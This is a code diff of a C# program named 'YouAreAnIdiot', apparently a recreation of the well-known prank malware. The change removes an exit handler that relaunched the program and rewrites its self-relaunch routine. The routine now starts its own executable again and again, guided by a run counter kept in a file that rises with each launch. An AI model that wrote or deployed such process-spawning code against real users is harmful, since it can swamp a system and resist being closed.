@@ -21,36 +21,38 @@ namespace YouAreAnIdiot
                 return;
             }
             ApplicationConfiguration.Initialize();
-            Application.ApplicationExit += OnApplicationExit!;
             Application.Run(new Form1());
         }
-        private static void OnApplicationExit(object sender, EventArgs e)
-        {
-            if (!SafeMode)
-            {
-                OpenItself();
-            }
-        }
+
         public static void OpenItself()
         {
             if (!SafeMode)
             {
-                for (int j = 0; j < i; j++)
+                int openTimes = ReturnExecutions();
+                for (int j = 0; j < openTimes; j++)
                 {
                     Process.Start(Application.ExecutablePath);
                 }
             }
 
         }
+
         private static void ExecutionsLogic()
         {
+            i = ReturnExecutions();
+            i++;
+            File.WriteAllText(Path, i.ToString()); // write i value for the next execution
+        }
+
+        private static int ReturnExecutions()
+        {
+            int times = 0;
             if (File.Exists(Path))
             {
                 string text = File.ReadAllText(Path);
-                int.TryParse(text, out i);
+                int.TryParse(text, out times);
             }
-            i++;
-            File.WriteAllText(Path, i.ToString()); // write i value for the next execution
+            return times;
         }
         public static void PlaySound()
         {
